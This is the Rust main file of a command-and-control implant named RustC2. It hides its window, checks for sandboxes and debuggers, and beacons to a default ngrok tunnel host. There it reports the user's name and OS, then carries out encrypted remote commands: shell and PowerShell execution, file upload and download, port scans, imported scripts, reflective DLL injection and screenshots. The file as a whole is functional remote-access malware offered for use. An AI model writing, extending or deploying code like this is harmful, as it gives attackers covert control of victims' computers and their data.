#![windows_subsystem = "windows"]
use clap::{arg, Command};
use simple_crypt::{decrypt, encrypt};
use std::{
    collections::HashMap,
    io::{Read, Write},
    net::TcpStream,
    process::exit,
    thread,
    time::Duration,
};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
use rand::rngs::OsRng;
mod utils;
mod sandbox;
mod inject;

use utils::ImportedScript;

#[cfg(unix)]
use daemonize::Daemonize;
#[cfg(unix)]
fn daemonize_process() {
     let daemonize = Daemonize::new()
     .pid_file("/tmp/rustc2.pid")
     .chown_pid_file(true)
     .working_directory("/tmp");

     match daemonize.start() {
         Ok(_) => println!("Daemonized successfully"),
         Err(e) => eprintln!("Error, {}", e),
     }
}

fn main() {
    sandbox::check_memory_limit();
    sandbox::sleep_evasion(Duration::from_secs(1));
    #[cfg(windows)]
    sandbox::check_debugger();

    let mut host = "0.tcp.in.ngrok.io".to_string();
    let mut port = "17418".to_string();
    let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();

    let matches = Command::new("RustC2")
        .version("0.1.0")
        .about("RustC2 Client, Used for controlling the agent")
        .arg(arg!(-H --host [IpAddr] "The host ip of the server (default 127.0.0.1)"))
        .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
        .arg(arg!(-d --daemonize "Daemonize the client"))
        .get_matches();

    if let Some(h) = matches.get_one::<String>("host") {
        host = h.to_string();
    }
    if let Some(p) = matches.get_one::<String>("port") {
        port = p.to_string();
    }

    if matches.get_flag("daemonize") {
        #[cfg(unix)]
        daemonize_process();
    }

    let username = std::env::var("USERNAME").expect("username variable not set");
    let os = std::env::consts::OS;

    loop {
        match TcpStream::connect(format!("{}:{}", host, port)) {
            Ok(mut stream) => {
                let value = shared_secret(&mut stream);
                let shared_secret: &[u8; 32] = value.as_bytes();
                let outinfo = format!("||ACSINFO||{}||{}\r\n", username, os);
                let encrypted_data =
                    encrypt(outinfo.as_bytes(), shared_secret).expect("Failed to encrypt");
                stream.write(&encrypted_data).unwrap();
                loop {
                    let mut buffer = [0; 1024];
                    let _ = match stream.read(&mut buffer) {
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    if buffer[0] == 0 {
                        continue;
                    }
                    let data = decrypt(&buffer, shared_secret).expect("Failed to decrypt");
                    let command = String::from_utf8(data).unwrap();
                    let command_clone = command.clone();
                    std::io::stdout().flush().unwrap();
                    let stream_to_use = &mut stream;
                    if command_clone.starts_with("||UPLOAD||") {
                        let output = utils::handle_upload(stream_to_use, &command_clone, shared_secret);
                        match output {
                            Ok(_) => {
                                println!("Successfully uploaded file");
                            }
                            Err(_) => {
                                println!("Error uploading file");
                            }
                        }
                    } else if command_clone.starts_with("||DOWNLOAD||") {
                        utils::handle_download(stream_to_use, &command_clone, shared_secret);
                    } else if command_clone.starts_with("||CMDEXEC||") {
                        utils::handle_cmd(stream_to_use, &command_clone, os.to_string(), shared_secret);
                    } else if command_clone.starts_with("||PSHEXEC||") {
                        utils::handle_psh(stream_to_use, &command_clone, shared_secret);
                    } else if command_clone.starts_with("||SCAN||") {
                        utils::handle_portscan(stream_to_use, &command_clone, shared_secret);
                    } else if command.starts_with("||IMPORTSCRIPT||") {
                        let output = utils::handle_import_psh(
                            stream_to_use,
                            &mut imported_scripts,
                            shared_secret
                        );
                        match output {
                            Ok(_) => {
                                println!("Successfully imported script");
                            }
                            Err(_) => {
                                println!("Error importing script");
                            }
                        }
                    } else if command.starts_with("||RUNSCRIPT||") {
                        utils::handle_run_script(&mut stream, &command, &imported_scripts, shared_secret);
                    } else if command.starts_with("||INJECT||") 
                    {
                        #[cfg(windows)]
                        inject::reflective_inject(&mut stream, command, shared_secret);
                    } else if command_clone.starts_with("||SCREENSHOT||") {
                        utils::handle_screenshot();
                    } else if command_clone.starts_with("||EXIT||") {
                        exit(1);
                    } else {
                        continue;
                    }
                }
            }
            Err(_) => {
                println!("Failed to connect to the server. Retrying in 5 seconds...");
                thread::sleep(Duration::from_secs(5));
            }
        }
    }
}

pub fn shared_secret(stream: &mut TcpStream) -> SharedSecret {
    let client_private_key = EphemeralSecret::random_from_rng(OsRng);
    let client_public_key = PublicKey::from(&client_private_key);

    let mut server_public_key_bytes = [0u8; 32];
    stream.read(&mut server_public_key_bytes).unwrap();
    let server_public_key = PublicKey::from(server_public_key_bytes);
    let shared_secret = client_private_key.diffie_hellman(&server_public_key);

    stream.write(client_public_key.as_bytes()).unwrap();
    stream.flush().unwrap();
    shared_secret
}